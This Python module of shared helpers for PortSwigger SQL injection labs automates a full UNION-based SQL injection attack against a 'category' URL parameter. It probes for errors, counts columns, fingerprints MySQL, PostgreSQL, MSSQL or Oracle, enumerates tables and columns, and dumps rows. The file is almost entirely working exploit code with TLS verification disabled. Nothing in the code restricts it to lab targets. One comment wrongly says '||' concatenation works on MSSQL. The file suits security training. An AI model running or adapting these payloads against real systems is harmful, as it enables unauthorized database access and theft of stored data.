# sqli_utils.py
# Shared utility functions used across all PortSwigger SQLi labs.
# Import these into individual lab files rather than duplicating logic.

import requests
import urllib3
from bs4 import BeautifulSoup
from proxies import proxies

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ---------------------------------------------------------------------------
# DB fingerprint payloads
# Each entry has:
#   expr        — the version expression to inject into the SELECT column list
#   comment     — the comment style that terminates the original query
#   from_clause — extra FROM clause needed (Oracle only; empty string for others)
#
# ---------------------------------------------------------------------------
DB_PAYLOADS = {
    "MySQL":      {"expr": "@@version",  "comment": "#",  "from_clause": ""},
    "PostgreSQL": {"expr": "version()",  "comment": "--", "from_clause": ""},
    "MSSQL":      {"expr": "@@version",  "comment": "--", "from_clause": ""},
    "Oracle":     {"expr": "banner",     "comment": "--", "from_clause": "FROM v$version"},
}

FILTER_PATH = "filter"

# ---------------------------------------------------------------------------
# System catalog queries, split into expression and FROM clause so they can
# be injected correctly into the UNION SELECT column list.
#
# Oracle uses all_tables / all_tab_columns instead of information_schema.
# ---------------------------------------------------------------------------
TABLE_QUERIES = {
    "oracle":     {"expr": "table_name",  "from_clause": "FROM all_tables"},
    "non-oracle": {"expr": "table_name",  "from_clause": "FROM information_schema.tables"},
}

COLUMN_QUERIES = {
    "oracle":     {"expr": "column_name", "from_clause": "FROM all_tab_columns WHERE table_name='{table}'"},
    "non-oracle": {"expr": "column_name", "from_clause": "FROM information_schema.columns WHERE table_name='{table}'"},
}


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def banner():
    print("""
╔══════════════════════════════════════════════╗
║                 SQL Injection                ║
║               PortSwigger Academy            ║
╚══════════════════════════════════════════════╝
    """)


def section(title):
    print(f"\n{'─' * 50}")
    print(f"  {title}")
    print(f"{'─' * 50}")


# ---------------------------------------------------------------------------
# Core reusable functions
# ---------------------------------------------------------------------------

def check_vulnerability(url, path="filter"):
    """
    Inject a single quote to trigger a SQL syntax error.
    A 500 response (or error text) confirms input reaches the DB unsanitised.
    """
    section("Checking for SQLi Vulnerability")
    print("  ➜  Probe: '")

    response = requests.get(
        url + path,
        params={"category": "'"},
        proxies=proxies,
        verify=False,
    )

    if response.status_code == 500 or "Internal Server Error" in response.text:
        print(f"  ✔  [{response.status_code}] Server errored — target is likely vulnerable.")
        return True

    print(f"  ✘  [{response.status_code}] No error — target may not be vulnerable.")
    return False


def get_number_of_columns(url, path="filter"):
    """
    Use ORDER BY to count columns in the original query.
    Increment the index until the server throws an error;
    the previous index is the column count.
    """
    section("Detecting Number of Columns (ORDER BY)")

    for i in range(1, 20):
        payload = f"' ORDER BY {i}--"
        response = requests.get(
            url + path,
            params={"category": payload},
            proxies=proxies,
            verify=False,
        )

        ok = response.status_code == 200 and "Internal Server Error" not in response.text
        print(f"  {'✔' if ok else '✘'}  ORDER BY {i}  [{response.status_code}]")

        if not ok:
            print(f"\n  ★  Column count: {i - 1}  (ORDER BY {i} caused error)")
            return i - 1

    print("  ✘  Could not determine column count within 20 columns.")
    return None


def find_text_column(url, col_num, random_value="test", path="filter"):
    """
    Probe each column position with a known string value to find which
    columns accept and render string data. Required before extracting text
    via UNION — type mismatches will cause errors otherwise.
    Returns the 1-based index of the first usable string column.
    """
    section(f"Finding a String-Compatible Column (value: '{random_value}')")

    for i in range(1, col_num + 1):
        cols = ", ".join(
            [f"'{random_value}'" if j == i else "NULL" for j in range(1, col_num + 1)]
        )
        payload = f"' UNION SELECT {cols}--"
        response = requests.get(
            url + path,
            params={"category": payload},
            proxies=proxies,
            verify=False,
        )

        print(f"  {'✔' if response.status_code == 200 else '✘'}  Column {i}  [{response.status_code}]")

        if random_value in response.text:
            print(f"\n  ★  String column found at position {i}")
            return i

    print("  ✘  No string-compatible column found.")
    return None


def detect_db_type(url, col_num, path="filter"):
    """
    Try each DB's version expression via UNION SELECT and match keywords
    in the response to identify the database engine.

    Uses the from_clause field in DB_PAYLOADS to handle Oracle's requirement
    that every SELECT must reference a table (v$version here, not dual, because
    'banner' lives in v$version).

    Returns a string: "MySQL", "PostgreSQL", "MSSQL", "Oracle", or None.
    """
    section("Fingerprinting Database Type")

    text_col = find_text_column(url, col_num, random_value="DB_PROBE", path=path)
    if not text_col:
        print("  ✘  Cannot fingerprint — no string column available.")
        return None

    for db, cfg in DB_PAYLOADS.items():
        cols = ["NULL"] * col_num
        cols[text_col - 1] = cfg["expr"]
        col_str = ", ".join(cols)

        # from_clause is empty for MySQL/PostgreSQL/MSSQL; "FROM v$version" for Oracle
        payload = f"' UNION SELECT {col_str} {cfg['from_clause']} {cfg['comment']}"

        response = requests.get(
            url + path,
            params={"category": payload},
            proxies=proxies,
            verify=False,
        )

        print(f"  {'✔' if response.status_code == 200 else '✘'}  [{response.status_code}]  {db:<12} → {cfg['expr']}")

        if response.status_code != 200:
            continue

        # Match known version string keywords that each DB embeds in its version output
        for keyword in ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle Database"]:
            if keyword.lower() in response.text.lower():
                print(f"\n  ★  Confirmed: {db}  ('{keyword}' found in response)")
                return db

        # 200 OK with no recognisable keyword — still a good candidate
        print(f"\n  ★  Likely {db}  (200 OK, version string not directly visible)")
        return db

    print("  ✘  Could not identify database type.")
    return None


def union_select(url, col_num, select_expr, from_clause="", path=FILTER_PATH):
    """
    Fire a UNION SELECT and return all <th>/<td> text values from the response.

    Parameters
    ----------
    select_expr  : the column expression to inject (e.g. "table_name", "column_name")
    from_clause  : optional FROM clause for the injected SELECT
                   (empty for inline expressions like @@version;
                    "FROM all_tables" for Oracle catalog queries)
    path         : URL path to append to base url

    BUG FIX: the original hardcoded FILTER_PATH instead of using the path param.
    """
    text_col = find_text_column(url, col_num, random_value="UNION_PROBE", path=path)
    if not text_col:
        print("  ✘  Cannot run UNION SELECT — no string column found.")
        return []

    cols = ["NULL"] * col_num
    cols[text_col - 1] = select_expr
    col_str = ", ".join(cols)

    payload = f"' UNION SELECT {col_str} {from_clause}--"

    response = requests.get(
        url + path,
        params={"category": payload},
        proxies=proxies,
        verify=False,
    )

    if response.status_code != 200:
        print(f"  ✘  [{response.status_code}] UNION SELECT failed.")
        return []

    soup = BeautifulSoup(response.text, "html.parser")
    return [tag.text.strip() for tag in soup.find_all(["th", "td"]) if tag.text.strip()]


def list_tables(url, col_num, db_key):
    """
    Dump all table names from the appropriate system catalog.
    db_key must be "oracle" or "non-oracle".
    """
    section("Listing Tables")

    q = TABLE_QUERIES[db_key]
    tables = union_select(url, col_num, q["expr"], q["from_clause"])

    if not tables:
        print("  ✘  No tables returned.")
        return []

    print(f"\n  ✔  {len(tables)} table(s) found:\n")
    for i, name in enumerate(tables, 1):
        print(f"    {i:>3}.  {name}")

    return tables


def list_columns(url, col_num, db_key, table_name):
    """
    Dump all column names for the given table from the appropriate system catalog.
    """
    section(f"Listing Columns in '{table_name}'")

    q = COLUMN_QUERIES[db_key]
    from_clause = q["from_clause"].format(table=table_name)
    columns = union_select(url, col_num, q["expr"], from_clause)

    if not columns:
        print(f"  ✘  No columns returned for '{table_name}'.")
        return []

    print(f"\n  ✔  {len(columns)} column(s) found:\n")
    for i, name in enumerate(columns, 1):
        print(f"    {i:>3}.  {name}")

    return columns


def dump_table(url, col_num, table_name, columns):
    """
    Dump rows from a table by concatenating chosen columns with ' | ' as separator.
    Uses || for concatenation (Oracle, PostgreSQL, MSSQL).
    For MySQL, swap || with CONCAT(a,' | ',b).
    """
    section(f"Dumping Data from '{table_name}'")

    concat_expr = " || ' | ' || ".join(columns)
    rows = union_select(url, col_num, concat_expr, f"FROM {table_name}")

    if not rows:
        print(f"  ✘  No rows returned from '{table_name}'.")
        return

    header = " | ".join(columns)
    print(f"\n  ✔  {len(rows)} row(s):\n")
    print(f"    {header}")
    print(f"    {'─' * len(header)}")
    for row in rows:
        print(f"    {row}")
